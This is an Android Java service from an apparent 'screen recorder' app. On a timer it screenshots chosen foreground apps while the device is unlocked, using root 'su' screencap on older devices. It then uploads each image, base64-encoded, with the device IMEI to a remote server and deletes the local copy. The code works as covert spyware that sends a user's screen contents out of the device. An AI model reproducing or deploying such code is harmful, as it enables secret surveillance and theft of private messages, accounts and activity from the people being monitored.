package com.recorder.screen.screen_recorder.services;

import android.app.KeyguardManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.os.PowerManager;
import android.support.annotation.Nullable;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.recorder.screen.screen_recorder.helper.Base64;
import com.recorder.screen.screen_recorder.helper.Detector;
import com.recorder.screen.screen_recorder.helper.LollipopDetector;
import com.recorder.screen.screen_recorder.helper.PreLollipopDetector;
import com.recorder.screen.screen_recorder.helper.UrlDemo;
import com.recorder.screen.screen_recorder.helper.Utils;
import com.recorder.screen.screen_recorder.helper.Values;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FilenameFilter;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

public class CatureScreenAndSendServer extends Service {

    String finalyahoostring ;
    private ConnectivityManager connectivity;
    private NetworkInfo wifiInfo;
    private WifiManager mWifiManager;
    private String yahooFileName;

    PowerManager pm1;

    public static boolean fileSendyahoo_statrted =false;
    public static boolean running =false;
    private Timer timer, timer1;
    private String time_stamp;
    byte[] BYTE;

    public static String ss_package_name = "";

    public static int s = 1;


    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    class Mp3Filter implements FilenameFilter {
        @Override
        public boolean accept(File dir, String name) {
            return (name.endsWith(".png"));
        }
    }

    @Override
    public void onStart(Intent intent, int startId) {
        pm1 = (PowerManager) getSystemService(Context.POWER_SERVICE);


        IntentFilter filter = new IntentFilter(Intent.ACTION_SCREEN_ON);
        filter.addAction(Intent.ACTION_SCREEN_OFF);
        // filter.addAction(Intent.ACTION_SCREEN_OFF);
        filter.setPriority(999);
        running =true;
    }

    public boolean deviceIsRooted() {
        String binaryName = "su";
        boolean found = false;
        if (!found) {
            String[] places = {"/sbin/", "/system/bin/", "/system/xbin/", "/data/local/xbin/",
                    "/data/local/bin/", "/system/sd/xbin/", "/system/bin/failsafe/", "/data/local/"};
            for (String where : places) {
                if (new File(where + binaryName).exists ()) {
                    found = true;
                    break;
                }
            }
        }
        return found;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        try {
            running =true;
            Date dt = new Date();
            int min = dt.getMinutes();
            int hr = dt.getHours();
            String strmin = "", strhr = "";
            if (min < 10)
                strmin = "0" + Integer.toString(min);
            else
                strmin = Integer.toString(min);
            if (hr < 10)
                strhr = "0" + Integer.toString(hr);
            else
                strhr = Integer.toString(hr);
            time_stamp = "" + strhr + "_" + strmin + "_" + Integer.toString(dt.getMonth() + 1) + "_" + Integer.toString(dt.getDate()) + "_" + Integer.toString(dt.getYear() + 1900) + "_";
        } catch (Exception e) {
            Log.d(getClass().getSimpleName(), "Exception:" + e);

        }

        Calendar c = Calendar.getInstance();
        SimpleDateFormat df = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
        final String formattedDate = df.format(c.getTime());

        timer = new Timer();
        timer.schedule(new TimerTask() {
            @Override
            public void run() {
                try {
                    Log.e(".............", "-----------------------------------------Capture Screen");

                    Detector dc;
                    String topPackage = "";
                    String topPackageName = "";
                    if(Utils.postLollipop()){
                        dc = new LollipopDetector();}
                    else {
                        dc = new PreLollipopDetector(); }

                    try {
                        if(dc.getForegroundApp(getApplicationContext()) != null) {
                            topPackage = dc.getForegroundApp(getApplicationContext());
                        }
                        else {
                            topPackage = "";
                        }
                    }
                    catch (Exception e) { topPackage = ""; }

                    try{
                        if(!topPackage.equalsIgnoreCase("")) {
                            KeyguardManager km = (KeyguardManager) getSystemService(Context.KEYGUARD_SERVICE);
                            if(!km.inKeyguardRestrictedInputMode()) {
                                //if (!topPackage.equalsIgnoreCase("com.sec.android.app.launcher")) {
                                if (Values.getSharedPrefrence("PacksName", getApplicationContext()).contains(topPackage)) {
                                    ss_package_name = topPackage;

                                    if (Build.VERSION.SDK_INT < 21) {
                                        if (deviceIsRooted()) {

                                            Process sh = Runtime.getRuntime().exec("su", null, null);
                                            OutputStream os = sh.getOutputStream();
                                            os.write(("/system/bin/screencap -p " + "/sdcard/img.png").getBytes("ASCII"));
                                            os.flush();
                                            os.close();
                                            sh.waitFor();

                                            String exsistingFileName = Environment.getExternalStorageDirectory() + File.separator + "img.png";
                                            Bitmap bitmap = resizeBitMapImage1(exsistingFileName, 300, 300);
                                            Bitmap resized = Bitmap.createScaledBitmap(bitmap, (int) (bitmap.getWidth() * 0.8), (int) (bitmap.getHeight() * 0.8), true);

                                            int w = bitmap.getWidth();
                                            int h = bitmap.getHeight();

                                            ByteArrayOutputStream bytes = new ByteArrayOutputStream();
                                            bitmap.compress(Bitmap.CompressFormat.JPEG, 80, bytes);


                                            File f = new File(Environment.getExternalStorageDirectory() + File.separator + "ss.png");
                                            f.createNewFile();
                                            FileOutputStream fo = new FileOutputStream(f);
                                            fo.write(bytes.toByteArray());
                                            fo.close();

                                            try {
                                                File ff = new File(Environment.getExternalStorageDirectory() + File.separator + "img.png");
                                                if (ff.exists()) {
                                                    ff.delete();
                                                }
                                            } catch (Exception e) {
                                                Log.e("............", e.toString());
                                            }
                                        }
                                    } else {
                                        Intent intentapp = new Intent(getApplicationContext(), VideoScreenshot.class);
                                        intentapp.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                        //intentapp.addFlags(Intent.FLAG_ACTIVITY_PREVIOUS_IS_TOP);
                                        //intentapp.addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT);
                                        startActivity(intentapp);
                                    }
                                }
                            }
                        }
                    }
                    catch (Exception e) { System.out.println("Capture Screen Error : "+e.toString()); }
                }
                catch (Exception e){
                    System.out.println("Exception" +e.getMessage());
                }
            }
        },100, 30000);

        try {
            yahoofilesend();
        }
        catch (Exception e ) {}
        return super.onStartCommand(intent, flags, startId);
    }

    public void yahoofilesend()
    {
        InputStream inputStream = null;
        final HttpClient httpclient = new DefaultHttpClient();
        String scrnupld = UrlDemo.scrupload;
        final HttpPost httppost = new HttpPost(scrnupld);

        TelephonyManager tm =(TelephonyManager) getSystemService(TELEPHONY_SERVICE);
        String imei = tm.getDeviceId();
        byte[] imeiyahoo = imei.getBytes();
        String imeibaseyahoo= android.util.Base64.encodeToString(imeiyahoo, android.util.Base64.DEFAULT);
        final String imeibasyahoostring = imeibaseyahoo.replaceAll("\n", "");

        timer1 = new Timer();
        timer1.scheduleAtFixedRate(new TimerTask() {

            @Override
            public void run() {
                try
                {
                    String packageName = ss_package_name;

                    String MEDIA_PATH = new String(Environment.getExternalStorageDirectory()+ File.separator +"ss.png");
                    File file1 = new File(MEDIA_PATH);
                    if(file1.exists()) {
                    connectivity = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
                    wifiInfo = connectivity.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
                    NetworkInfo wifiInfo1 = connectivity.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);

                    if(wifiInfo.getState().toString().equalsIgnoreCase("CONNECTED")||wifiInfo1.getState().toString().equalsIgnoreCase("CONNECTED")) {
                        try {
                            finalyahoostring = Base64.encodeFromFile(file1.getAbsolutePath());//.encodeBytes(Base64.decode(SimpleCrypto.decrypt(fileContent)));
                        } catch (Exception e) {
                            Log.v("File", "Exception thrown in decoding file " + e);
                        }
                        try {
                            Date dt = new Date();
                            int min = dt.getMinutes();
                            int hr = dt.getHours();
                            String strmin = "", strhr = "";
                            if (min < 10)
                                strmin = "0" + Integer.toString(min);
                            else
                                strmin = Integer.toString(min);
                            if (hr < 10)
                                strhr = "0" + Integer.toString(hr);
                            else
                                strhr = Integer.toString(hr);
                            time_stamp = "" + strhr + "_" + strmin + "_" + Integer.toString(dt.getMonth() + 1) + "_" + Integer.toString(dt.getDate()) + "_" + Integer.toString(dt.getYear() + 1900) + "_";
                        } catch (Exception e) {
                            Log.d(getClass().getSimpleName(), "Exception:" + e);

                        }
                        try {
                            String emailfile_name = time_stamp + packageName + "Screenshot.jpeg";
                            byte[] namedata = emailfile_name.getBytes("UTF-8");
                            String filenameencode = android.util.Base64.encodeToString(namedata, android.util.Base64.DEFAULT);
                            yahooFileName = filenameencode.replaceAll("\n", "");

                            List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>();
                            String time = file1.getName();

                            nameValuePairs.add(new BasicNameValuePair("IMEI", imeibasyahoostring));
                            nameValuePairs.add(new BasicNameValuePair("DATA", finalyahoostring));
                            nameValuePairs.add(new BasicNameValuePair("FNAME", yahooFileName));

                            httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));

                            HttpResponse response = httpclient.execute(httppost);
                            response.getStatusLine();
                            // entity.consumeContent();
                            HttpEntity entity = response.getEntity();
                            entity = response.getEntity();

                            InputStream in = entity.getContent();
                            String buffer = "";
                            for (int i = in.read(); i != -1; i = in.read()) {
                                buffer += (char) i;
                                i++;
                            }
                            Log.v("Capture", "Response of Screenshot " + buffer);
                            System.gc();

                            if (buffer.equalsIgnoreCase("OK")) {

                                file1.delete();
                                System.gc();

                            }

                            in.close();

                            if (entity != null) {
                                entity.consumeContent();
                            }

                        } catch (ClientProtocolException e) {
                            Log.v("File", "ClientProtocolException  thrown " + e);
                        } catch (IOException e) {
                            Log.v("File", "IOException  thrown " + e);
                        } catch (Exception e) {
                            Log.v("File", "Exception thrown" + e);
                        }
                    }
                    }
                    else

                        file1.delete();
                    System.gc();
                }
                catch(Exception e)
                {
                    Log.v("File", "EXception thrown in accessing folder "+e);
                }

            }// run method

        }, 4000, 30000);
        System.gc();
    }

    public static Bitmap resizeBitMapImage1(String filePath, int targetWidth, int targetHeight) {
        Bitmap bitMapImage = null;
        try {
            BitmapFactory.Options options = new BitmapFactory.Options();
            options.inJustDecodeBounds = true;
            BitmapFactory.decodeFile(filePath, options);
            double sampleSize = 0;
            Boolean scaleByHeight = Math.abs(options.outHeight - targetHeight) >= Math.abs(options.outWidth
                    - targetWidth);
            if (options.outHeight * options.outWidth * 2 >= 1638) {
                sampleSize = scaleByHeight ? options.outHeight / targetHeight : options.outWidth / targetWidth;
                sampleSize = (int) Math.pow(2d, Math.floor(Math.log(sampleSize) / Math.log(2d)));
            }
            options.inJustDecodeBounds = false;
            options.inTempStorage = new byte[128];
            while (true) {
                try {
                    options.inSampleSize = (int) sampleSize;
                    bitMapImage = BitmapFactory.decodeFile(filePath, options);
                    break;
                } catch (Exception ex) {
                    try {
                        sampleSize = sampleSize * 2;
                    } catch (Exception ex1) {

                    }
                }
            }
        } catch (Exception ex) {

        }
        return bitMapImage;
    }

    @Override
    public void onDestroy() {

        running =false;
        try {
            timer1.cancel();
        } catch (Exception e) {}

        try {
            timer.cancel();
        } catch (Exception e) {}
        super.onDestroy();
    }
}
